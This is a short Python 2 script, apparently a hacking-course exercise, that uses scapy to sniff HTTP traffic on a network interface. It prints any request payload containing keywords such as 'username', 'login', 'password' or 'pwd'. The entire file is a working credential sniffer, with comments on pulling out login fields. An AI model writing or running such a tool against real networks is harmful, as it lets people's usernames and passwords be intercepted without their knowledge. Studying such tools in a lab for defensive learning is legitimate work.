#!/usr/bin/env python

#Python 2 version of packet sniffer from LEHAPFS course

import scapy.all as scapy
from scapy.layers import http
#pip install scapy-http / scapy_http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load #make it a var and then check to see if it contains specific text
            keywords = ["username", "user", "usr", "login", "password", "pass", "pwd", "pw"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
            #if "usr" or "username" in load:
                #print(load)
            #print(packet[scapy.Raw].load) #print specific field, in this case user+pwd hopefully
            #print(packet.show) #packet.show will give field of packet

#to find the layer you want to drill down into:
#print(packet.show) - this gives the fields that you can access
        

sniff("eth0")
